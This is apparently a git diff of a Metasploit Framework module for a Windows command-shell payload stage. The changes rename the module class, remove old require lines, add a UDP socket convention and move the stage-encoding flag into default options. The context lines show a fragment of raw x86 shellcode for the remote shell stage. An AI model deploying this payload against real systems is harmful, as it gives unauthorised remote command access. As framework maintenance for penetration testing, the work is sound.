@@ -1,13 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'msf/base/sessions/command_shell'
-require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module MetasploitModule
 
   include Msf::Payload::Windows
   include Msf::Sessions::CommandShellOptions
@@ -23,7 +20,7 @@ module Metasploit3
       'Session'       => Msf::Sessions::CommandShellWindows,
       'PayloadCompat' =>
         {
-          'Convention' => 'sockedi -http -https'
+          'Convention' => 'sockedi udpsockedi -http -https'
         },
       'Stage'         =>
         {
@@ -47,12 +44,12 @@ module Metasploit3
             "\x86\xFF\xD5\x89\xE0\x4E\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF" +
             "\xD5\xBB\xE0\x1D\x2A\x0A\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C" +
             "\x0A\x80\xFB\xE0\x75\x05\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
+        },
+      'DefaultOptions' =>
+        {
+          # Stage encoding is safe for this payload
+          'EnableStageEncoding' => true
         }
       ))
-  end
-
-  # Stage encoding is safe for this payload
-  def encode_stage?
-    true
   end
 end
